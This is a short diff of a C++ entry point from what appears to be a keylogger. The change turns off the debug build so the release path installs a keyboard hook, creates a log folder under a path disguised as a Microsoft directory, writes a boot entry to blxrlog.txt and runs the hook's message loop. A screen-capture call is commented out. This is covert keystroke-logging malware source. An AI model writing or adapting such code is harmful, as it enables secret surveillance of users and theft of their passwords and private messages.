@@ -4,7 +4,7 @@
 
 #define LOG_FILE_NAME "blxrlog.txt"
 
-#define DEBUG_BUILD
+//#define DEBUG_BUILD
 
 #ifdef DEBUG_BUILD
 #define DEB(x) std::cout << #x << " - " << x << std::endl;
@@ -13,16 +13,15 @@
 int main() {
 #ifdef DEBUG_BUILD
   DEB(stream::GetPath())
-  stream::MakeDir(stream::GetPath("\\Microsoft\\blxr"));
-  stream::WriteLog("", key_hook::active_process, true);
 #endif
 
 #ifndef DEBUG_BUILD
   key_hook::InstallHook();
 
+  stream::MakeDir(stream::GetPath("\\Microsoft\\blxr"));
   stream::WriteLog("[*] BOOT [*]", key_hook::active_process, true);
 
-  screen::CaptureScreen(stream::GetPath("\\Microsoft\\blxr", true), "screen.jpeg");
+  //screen::CaptureScreen(stream::GetPath("\\Microsoft\\blxr", true), "screen.jpeg");
 
   key_hook::HandleMessage(true);
 #endif
